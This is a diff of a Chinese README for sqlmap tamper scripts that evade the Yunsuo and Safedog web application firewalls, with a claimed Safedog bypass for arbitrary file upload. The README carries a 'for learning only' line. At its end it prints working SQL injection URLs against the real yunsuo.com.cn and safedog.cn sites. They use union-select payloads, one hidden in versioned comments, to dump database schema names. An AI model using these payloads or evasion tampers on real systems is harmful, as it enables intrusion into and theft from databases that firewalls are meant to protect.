@@ -3,16 +3,15 @@
 仅供学习 请勿用作非法用途<br>
 
 2.0：<br>
-增加优化了部分规则 现在bypass云锁tamper支持所有的注入类型了！<br>
-更新了bypass 云锁 数字型注入的tamper<br>
+增加优化了部分规则 现在bypass云锁tamper及bypass安全狗tamper支持所有的注入类型了！<br>
 更新了bypass 安全狗 任意文件上传的方法（适用于业务系统存在任意文件上传漏洞但是服务器安装了安全狗环境）<br>
+更新了bypass 安全狗 SQL注入tamper，现在支持所有类型的注入了<br>
 
 ## 针对最新版云锁和安全狗的sqlmap自动化绕过脚本<br>
 
 包含：<br>
-bypass安全狗 延时、布尔、union注入 <br>
-bypass云锁tamper字符型注入 （可0警告绕过云锁）<br>
-bypass云锁tamper数字型注入 （可0警告绕过云锁）<br>
+bypass安全狗sql注入tamper <br>
+bypass云锁SQL注入tamper （可0警告绕过云锁）<br>
 理论上来说规则越多速度也会越慢 所以不追求隐蔽性的可以按需求修改规则<br>
 
 ## 针对最新版安全狗的任意文件上传bypass<br>
@@ -34,4 +33,5 @@ blog:https://pureqh.top/?p=1225<br>
 
 ## 注：bypass云锁  
 http://help.yunsuo.com.cn/guide/install/?id=1' REGEXP "[...%26 %23*]" union select 1,group_concat(schema_name),3 from information_schema.schemata  
-
+## 注：bypass安全狗
+https://www.safedog.cn/news.html?id=4046' "/*" /*!11444union all select 1,(select group_concat(schema_name) from information_schema.schemata) ,3 */ --+  
